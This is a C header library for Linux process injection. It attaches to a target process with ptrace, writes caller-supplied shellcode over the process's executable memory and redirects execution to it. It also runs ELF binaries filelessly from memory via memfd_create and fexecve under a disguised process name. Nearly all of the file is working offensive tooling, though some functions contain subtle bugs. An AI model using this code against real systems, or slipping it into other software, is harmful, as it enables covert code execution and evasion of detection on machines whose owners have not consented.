#ifndef INJECT_MEMORY_H_
#define INJECT_MEMORY_H_
#define _GNU_SOURCE
#include <stdio.h>
#include <stdbool.h>
#include <stdarg.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <errno.h>
#include <string.h>
#include <sys/uio.h>
#include <inttypes.h>
#include <stdlib.h>
#include <stdint.h>
#include <sys/ptrace.h>
#include <sys/user.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>
#include <sys/mman.h>
#include <linux/fcntl.h>

#define MFD_CLOEXEC_ 0x0001U

/*
    Exposed Library Functions Here
*/


extern bool inject_memory_inject_code(const char* pid_, char* shellcode,size_t shellcode_size);
extern bool inject_memory_inject_elf(const char* pid, char* elf_bytes,size_t elf_size);
extern bool inject_memory_memfd_execute_elf(char* elf_bytes, size_t elf_size,const char* fake_name,bool is_script,bool fork_proc);

#endif



#ifdef INJECT_MEMORY_IMPLEMENTATION

typedef struct {
	uint8_t readable;
	uint8_t writable;
	uint8_t executable;
} permissions_t;

typedef struct {
	uint64_t offset_start;
	uint64_t offset_end;
} offset_t;

typedef struct {
	char* name;
	int name_length;
	offset_t* offsets;
	permissions_t* perms;
} memory_region_t;


typedef struct {
	int count;
	int capacity;
	memory_region_t** regions;
} memory_region_array_t;

static permissions_t* new_permissions(){
	return calloc(1,sizeof(permissions_t));
}

static offset_t* new_offset(){
	return calloc(1,sizeof(offset_t));
}

static memory_region_t* new_memory_region(){
	return calloc(1,sizeof(memory_region_t));
}

static memory_region_array_t* new_memory_region_array(){
	memory_region_array_t* array = (memory_region_array_t*)calloc(1,sizeof(memory_region_array_t));
	array->capacity = 1;
	array->count = 0;
	array->regions = calloc(array->capacity,sizeof(memory_region_t*));
}


static void free_memory_region(memory_region_t* region){
	if (region->offsets != NULL)
		free(region->offsets);
	if (region->perms != NULL)
		free(region->perms);
	free(region->name);
	free(region);
}

static void free_memory_region_array(memory_region_array_t* array){
	for (int x = 0; x < array->count; x++){
		free_memory_region(array->regions[x]);
	}	
	free(array->regions);
	free(array);
}

static void print_memory_region(memory_region_t* region){
	printf("%s ",region->name);
	printf("%"PRIx64 "-", region->offsets->offset_start);
	printf("%"PRIx64 " ", region->offsets->offset_end);
	printf("%s",region->perms->readable > 0 ?"r":"-");
	printf("%s",region->perms->writable > 0 ?"w":"-");
	printf("%s",region->perms->executable > 0 ?"x":"-");
	printf("\n");
}

static int parse_offset(offset_t* offsets,char* address_line){
	long unsigned start, end;
	char* start_address = strtok(address_line, "-");
	if (start_address == NULL){
		fprintf(stderr,"Failed to parse region start address");
		return -1;
	}
	// check if null
	char* end_address = strtok(NULL,"-");
	if (end_address == NULL){
		fprintf(stderr,"Failed to parse region end address");
		return -1;
	}
	start = strtoul(start_address, NULL, 16);
	if (start == 0){
		fprintf(stderr,"Failed to parse region start address");
		return -1;
	}
	end = strtoul(end_address, NULL, 16);
	if (start == 0){
		fprintf(stderr,"Failed to parse region start address");
		return -1;
	}
	offsets->offset_start = start;
	offsets->offset_end = end;
	return 0;
}

static int parse_permissions(permissions_t* perms,char* perm){
	char read,write,exec;
	if (strlen(perm) < 2) {
		fprintf(stderr,"permissions string invalid length");
		return -1;
	}
	read = *perm++;
	write = *perm++;
	exec = *perm++;
	if (read != '-')
		perms->readable = 1;
	if (write != '-')
		perms->writable = 1;
	if (exec != '-')
		perms->executable = 1;
	return 0;
}

static int skip_region(char* line){
	if (strstr(line, "vsyscall") != NULL) {
		return 1;
	}
	if (strstr(line, "vdso") != NULL) {
		return 1;
	}
	if (strstr(line, "vvar") != NULL) {
		return 1;
	}
    if (strstr(line, "stack") != NULL) {
		return 1;
	}
	if (strstr(line,"r-xp") == NULL)  {
		return 1;
	}
	return 0;
}

static void parse_region_name(char* name,memory_region_t* region){
	int region_name_len = strlen(name);
	if (region_name_len == 1){
		int len = strlen("anonymous");
		region->name = calloc(len,sizeof(char));
		strncpy(region->name,"anonymous",len);
		region->name_length = len;
		strtok(region->name, "\n");
		return;
	}
	region->name = calloc(region_name_len,sizeof(char));
	region->name_length = region_name_len;
	strncpy(region->name,name,region_name_len);
	strtok(region->name, "\n");
	return;
}




static void inject_debug_print(const char* format, ...){
    #ifdef INJECT_MEMORY_DEBUG
    #define INJECT_DEBUG_FLAG 1
    if (INJECT_DEBUG_FLAG){
        va_list args;
        char buffer[BUFSIZ];
        va_start(args,format);
        vsnprintf(buffer,sizeof(buffer),format,args);
        va_end(args);
        fprintf(stderr,buffer);
    }
    #endif
}




static memory_region_array_t* get_pid_regions(FILE* maps_file) {
    size_t len;
	ssize_t read;
	char* line = NULL;
	char* line_og = NULL;
	char* last = NULL;
	memory_region_array_t* array = new_memory_region_array();
	/// each line is a region
	while ((read = getline(&line, &len, maps_file)) != -1) {
		if (skip_region(line)){
			continue;
		}
		memory_region_t* region = new_memory_region();
		offset_t* offset = new_offset();
		permissions_t* perms = new_permissions();
		line_og = line;
		char* token = strtok_r(line, " ",&line_og);
		if (parse_offset(offset,token) != 0){
            inject_debug_print("DEBUG: Failed to parse permissions");              
			return NULL;
		}
		token = strtok_r(NULL," ",&line_og);
		if (token == NULL){
            inject_debug_print("DEBUG: Failed to parse permissions");            
			return NULL;
		}
		if (parse_permissions(perms,token) != 0){
            inject_debug_print("DEBUG: Failed to parse permissions");               
			return NULL;
		}
		while( token != NULL ) {
		  last = token;
		  token = strtok_r(NULL, " ",&line_og);
		}
		parse_region_name(last,region);
		region->offsets = offset;
		region->perms = perms;
		if (array->capacity < array->count + 1) {
			void* tmp = realloc(array->regions,sizeof(memory_region_t*)* (array->capacity*2));
			if (tmp == NULL){
                inject_debug_print("DEBUG: Cannot Realloc OOM.");                   
				fprintf(stderr,"ERROR: Your computer is out of memory lol.");
				exit(1);
			}
			array->regions = tmp;
			array->capacity = array->capacity * 2;
		}
		array->regions[array->count] = region;
		array->count++;
	}
	free(line);
	fclose(maps_file);
	return array;
}



static bool write_memory(pid_t pid, void* address,char* shellcode, int length){
	long word;
	for (int x = 0; x < length; x+= sizeof(long)){	
		memcpy(&word,&shellcode[x],sizeof(long));
		long result = ptrace(PTRACE_POKETEXT,pid,address + x, word);
		if (result == -1){
			fprintf(stderr,"ERROR: Failed to write memory to target process.");
            return false;
		}
	}
    return true;
}

static char* read_memory(pid_t pid, void* address, int length){
	char* data = malloc(sizeof(char)*length);
	for (int x = 0; x < length; x+= sizeof(long)){
		long word = ptrace(PTRACE_PEEKTEXT,pid,address + x, NULL);
		if (word == -1){
			fprintf(stderr,"ERROR: Failed to read memory from target process.");
			exit(1);
		}
		data[x] = word;
	}
	return data;
}


bool inject_memory_inject_code(const char* pid_, char* shellcode,size_t shellcode_size){
    pid_t pid = atoi(pid_);
	int status;
	char maps_buffer[25];
	sprintf(maps_buffer,"/proc/%s/maps",pid_);
    inject_debug_print("DEBUG: Target Map File %s\n",maps_buffer);      
	FILE* maps_file = fopen(maps_buffer,"r");
	if (maps_file == NULL){
        fprintf(stderr,"ERROR: Failed to open target maps file.");
		return false;
	}
    memory_region_array_t* array = get_pid_regions(maps_file);
    if (array->count == 0){
        fprintf(stderr,"ERROR: no available executable regions");
        free_memory_region_array(array);
        return false;
    }
	if (ptrace(PTRACE_ATTACH,pid,NULL,NULL) < 0 ){
		fprintf(stderr,"ERROR: failed to attach to pid %d\n",pid);
        free_memory_region_array(array);        
		return false;
	}
	waitpid(pid,&status,WUNTRACED);
	struct user_regs_struct oldregs,regs = {};	
	if ((ptrace (PTRACE_GETREGS, pid, NULL, &regs)) < 0){
		fprintf(stderr,"ERROR: failed to get registers");
        free_memory_region_array(array);           
		ptrace(PTRACE_DETACH,pid,NULL,NULL);  
		return false;
	}
	if ((ptrace (PTRACE_GETREGS, pid, NULL, &oldregs)) < 0){
		fprintf(stderr,"ERROR: failed to get registers");
        free_memory_region_array(array);           
		ptrace(PTRACE_DETACH,pid,NULL,NULL);          
		return false;
	}
    // currently using the first entry found which is usually the actual process binary executable section.
	uint64_t start_addr = array->regions[0]->offsets->offset_start;	
	char* region_backup = read_memory(pid,(void*)start_addr,shellcode_size);
	regs.rip = (unsigned long long)start_addr;
	inject_debug_print("DEBUG: Injecting shell code at %p\n", (void*)regs.rip);
	if (write_memory(pid,(void*)start_addr,shellcode,shellcode_size) == false){
        fprintf(stderr,"ERROR: Failed to write payload to process memory.");
        free_memory_region_array(array);           
        free(region_backup);
		inject_debug_print("DEBUG: Setting registers back to normal\n");
		ptrace(PTRACE_SETREGS,pid,NULL,&oldregs);
		ptrace(PTRACE_DETACH,pid,NULL,NULL);        
        return false;
    }
    // this below is really important.
	regs.rip += 2;
	if ((ptrace (PTRACE_SETREGS, pid, NULL, &regs)) < 0){
		fprintf(stderr,"ERROR: Failed to set registers");
        free_memory_region_array(array);           
        free(region_backup);
		inject_debug_print("DEBUG: Setting registers back to normal\n");
		ptrace(PTRACE_SETREGS,pid,NULL,&oldregs);
		ptrace(PTRACE_DETACH,pid,NULL,NULL);        
        return false;
	}
	inject_debug_print("DEBUG: Executing Code\n");
	ptrace(PTRACE_CONT,pid,NULL,NULL);
	waitpid(pid,&status,WUNTRACED);
	if (WIFSTOPPED(status) && WSTOPSIG(status) == SIGTRAP){
		inject_debug_print("DEBUG: Process stopped due to sig trap\n");
		inject_debug_print("DEBUG: Writing back memory\n");
		write_memory(pid,(void*)start_addr,region_backup,sizeof(shellcode));
		inject_debug_print("DEBUG: Setting register back to normal\n");
        free(region_backup);
		ptrace(PTRACE_SETREGS,pid,NULL,&oldregs);
		ptrace(PTRACE_DETACH,pid,NULL,NULL);
	} else {
		inject_debug_print("DEBUG: process stopped for some other reason\n");
        free_memory_region_array(array);        
        free(region_backup);
		ptrace(PTRACE_DETACH,pid,NULL,NULL);        
        return false;        
	}
	free_memory_region_array(array);
    return true;
}

bool inject_memory_inject_elf(const char* pid, char* elf_bytes,size_t elf_size){
    fprintf(stderr,"###TODO ADD ELF INJECTION");
    exit(-1);
}

extern bool inject_memory_memfd_execute_elf(char* elf_bytes, size_t elf_size,const char* fake_name, bool is_script,bool fork_proc){
	int fd = memfd_create(fake_name,is_script ? 0 : MFD_CLOEXEC_);
	if (fd == -1){
		fprintf(stderr,"ERROR: memfd_create failed %d",errno);
		return false;
	}
	int nwrote = write(fd,elf_bytes,elf_size);
	if (nwrote != elf_size){
		fprintf(stderr,"ERROR: failed to write bytes %d",errno);
		close(fd);
		return false;
	}
	inject_debug_print("DEBUG: wrote %d\n",nwrote);
	inject_debug_print("DEBUG: attempting execve.\n");
	char* fake_argv[] = {fake_name,NULL};
	char* fake_env[] =  {NULL,NULL};
	if (!fork_proc){
		if (fexecve(fd,fake_argv,fake_env) == -1){
			fprintf(stderr,"ERROR: failed to execve %d",errno);
			close(fd);		
			return false;
		}
		close(fd);		
		return true;
	}
	pid_t pid = fork();
	if (pid < 0) {
		fprintf(stderr,"ERROR: failed to fork %d",errno);
		exit(1);
	} else if (pid == 0){
		if (fexecve(fd,fake_argv,fake_env) == -1){
			fprintf(stderr,"ERROR: failed to execve %d",errno);
			close(fd);		
			return false;
		}
	} else {
		close(fd);
		return true;
	}
}

#endif

